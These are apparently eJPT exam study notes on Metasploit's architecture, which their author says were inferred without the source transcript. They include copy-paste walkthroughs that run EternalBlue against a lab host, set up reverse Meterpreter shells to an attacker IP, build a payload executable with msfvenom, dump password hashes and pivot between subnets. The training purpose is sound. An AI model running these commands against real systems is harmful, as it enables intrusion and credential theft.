# 03 - Metasploit Framework Architecture (eJPT Study Notes)

Note: The transcript was not provided. The content below is a conservative, exam-focused summary inferred from the filename and module context “01-MetasploitFrameworkOverview.” Commands and paths reflect common Kali Linux + Metasploit 6.x defaults.

## What the video covers (Introduction / big picture)
- The internal architecture of the Metasploit Framework (MSF)
- How interfaces, libraries, and modules fit together
- Core module types and how they interact during an engagement
- The role of the database, workspaces, and sessions
- Staged vs single payloads, handlers, and Meterpreter
- Extensibility via plugins, RPC, resource scripts, and custom modules

Big picture: MSF is a Ruby-based extensible exploitation framework. Interfaces like msfconsole sit atop the core libraries (Rex, Msf::Core), which load modules (exploits, auxiliary, payloads, encoders, nops, post). A PostgreSQL-backed database tracks hosts, services, creds, and loot. Payloads establish sessions handled by the framework, enabling post-exploitation. MSF can be automated via RPC and resource scripts.

## Flow (ordered)
1. Interfaces: msfconsole (interactive), msfvenom (payload builder), msfrpcd/msgrpc (automation).
2. Core libraries: Rex (network, sockets, protocols), Msf::Core (module framework), UI components.
3. Module taxonomy:
   - Exploit: triggers a vulnerability
   - Auxiliary: scans, brute force, fuzzing, etc.
   - Payloads: staged or single, e.g., Meterpreter
   - Encoders: legacy obfuscation for payloads
   - NOPs: padding/sleds
   - Post: post-exploitation actions
4. Datastore: global vs module options, environment persistence.
5. Database: PostgreSQL integration, workspaces, host/service/cred/vuln/loot tracking.
6. Payload architecture: staged vs single, reverse vs bind transports; handlers catch sessions.
7. Sessions: shell and meterpreter; jobs, backgrounding, and management.
8. Extensibility: plugins, RPC server, resource scripts, custom module paths.
9. Filesystem layout: module directories, logs, loot.
10. Typical workflow tying it all together: scan/import → select module → configure options → run → manage sessions → pivot/post-exploit → collect loot → report.

## Tools highlighted
- msfconsole: primary interface to the framework
- msfvenom: payload generator and encoder
- msfrpcd / msgrpc: RPC daemon or plugin for programmatic automation
- PostgreSQL: backend database
- Nmap (external): source of scan data; import into MSF
- Resource scripts (.rc): automation inside msfconsole

## Typical command walkthrough (detailed, copy-paste friendly)

Start database and Metasploit:
```bash
# Start PostgreSQL (Kali)
sudo service postgresql start

# Initialize MSF DB (if not already)
msfdb init

# Launch msfconsole quietly
msfconsole -q
```

Check DB and set up workspace:
```bash
db_status
workspace
workspace -a eJPT
workspace eJPT
```

Import scan results (preferred) or run nmap externally:
```bash
# Run Nmap externally and save XML
nmap -sV -O -T4 -oA netscan 192.168.56.0/24

# Import results into MSF
db_import netscan.xml

# View parsed assets
hosts
services
```

Enumerate and inspect modules:
```bash
# Count/list categories (long output)
show exploits
show auxiliary
show payloads

# Focused search examples
search type:exploit smb windows
search cve:2017-0144

# Inspect a module
use exploit/windows/smb/ms17_010_eternalblue
info
show options
show advanced
show targets
```

Configure datastore and run:
```bash
# Global defaults (persist with 'save')
setg LHOST 10.10.14.5
setg LPORT 4444
setg VERBOSE true

# Module-specific
set RHOSTS 192.168.56.101
set RPORT 445
show payloads

# Example staged Meterpreter
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run check if supported
check

# Launch exploit as a background job
set ExitOnSession false
run -j

# Manage sessions
sessions -l
sessions -i 1
background
```

Catch a payload with a handler (no exploit, just listening):
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 10.10.14.5
set LPORT 443
set ExitOnSession false
run -j
```

Basic Meterpreter post-exploitation:
```bash
# Inside a Meterpreter session
getuid
sysinfo
ipconfig
run post/windows/gather/enum_logged_on_users
hashdump  # requires privilege
```

Pivoting and routing:
```bash
# From msfconsole (routes used by native modules)
route print
route add 10.10.20.0 255.255.255.0 1  # route via session 1
route print

# Or via Meterpreter autoroute script
sessions -i 1
run autoroute -s 10.10.20.0/24
background
```

Global datastore persistence and logging:
```bash
getg LHOST
setg LHOST 10.10.14.5
save

# Log console to file
spool /tmp/msfconsole.log
spool off
```

Resource scripts (automation):
```bash
# Create a resource file
cat > auto.rc << 'EOF'
workspace -a quickrun
workspace quickrun
setg LHOST 10.10.14.5
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.56.0/24
set PORTS 22,80,445
run
EOF

# Run it at startup
msfconsole -q -r auto.rc
```

msfvenom payload examples:
```bash
# List payloads/encoders
msfvenom -l payloads
msfvenom -l encoders

# Generate a Windows x64 Meterpreter reverse HTTPS executable
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe

# Generate raw shellcode (C format)
msfvenom -p windows/x64/exec CMD="calc.exe" -f c -v shellcode -o shellcode.h
```

RPC for automation (two options):
```bash
# A) Start RPC daemon
msfrpcd -U msf -P secret -a 127.0.0.1 -p 55553 -S -f

# B) Or load RPC plugin inside msfconsole
msfconsole -q
load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=msf Pass=secret SSL=true
# ... use a client (Python/Ruby) to connect ...
unload msgrpc
```

Add custom module paths and reload:
```bash
# User module directory (MSF commonly uses ~/.msf4)
mkdir -p ~/.msf4/modules/{exploits,auxiliary,payloads,post}
loadpath ~/.msf4/modules
reload_all
```

Housekeeping:
```bash
jobs -l
jobs -K   # kill all jobs
sessions -l
sessions -K  # kill all sessions
loot
creds
notes
```

Common filesystem locations (Kali defaults, may vary):
- Modules: /usr/share/metasploit-framework/modules/
- Logs: ~/.msf4/logs/
- Loot: ~/.msf4/loot/
- Config/global datastore: ~/.msf4/config

Note: Some distros may use ~/.msf5 or keep ~/.msf4 for compatibility.

## Practical tips
- Prefer staged payloads for size-sensitive exploits; use single payloads when reliability or AV evasion of the stager is an issue.
- Set ExitOnSession false when running handlers or parallel exploitation to avoid halting on first session.
- Use workspaces to separate targets/labs and keep data tidy.
- Import Nmap XML to quickly populate hosts/services; db_nmap may be deprecated in your version—favor external nmap + db_import.
- Save global LHOST/LPORT once with setg + save to speed up future runs.
- Use run check when available to validate a target before exploiting.
- Pivot with route/autoroute to reach internal subnets; then re-run scanners through MSF so routes are honored.
- Avoid encoders for “AV evasion”—they rarely bypass modern defenses; rely on transport (HTTPS), LOLBins, or custom builds where allowed.
- Keep Metasploit updated via your package manager; module names and options can change across versions.

## Minimal cheat sheet (one-screen flow)
```bash
# Start
sudo service postgresql start
msfdb init
msfconsole -q

# DB + workspace
db_status
workspace -a lab && workspace lab
db_import scan.xml
hosts; services

# Find & prep module
search type:exploit smb
use exploit/windows/smb/ms17_010_eternalblue
show options; show payloads
setg LHOST 10.10.14.5
set RHOSTS 192.168.56.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set ExitOnSession false
check
run -j

# Sessions & pivot
sessions -l
sessions -i 1
background
route add 10.10.20.0 255.255.255.0 1
route print

# Handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 10.10.14.5 LPORT 443
run -j

# msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe

# Save & logs
save
spool /tmp/msf.log
spool off
```

## Summary
- Metasploit’s architecture layers interfaces (msfconsole, msfvenom, RPC) over core libraries (Rex, Msf::Core) that load a rich module ecosystem (exploit/auxiliary/payload/encoder/nop/post).
- The datastore (global vs module), database (PostgreSQL), and workspaces structure your engagement data and options.
- Payload design (staged vs single, reverse vs bind) dictates how sessions are established and handled.
- Sessions unlock post-exploitation; routing and handlers enable pivoting and multi-stage operations.
- Extensibility comes from plugins, RPC, resource scripts, and custom modules, letting you automate and scale tasks.
- These building blocks form the standard eJPT workflow: import recon → pick module → configure → run → manage sessions → post-exploit → collect/report.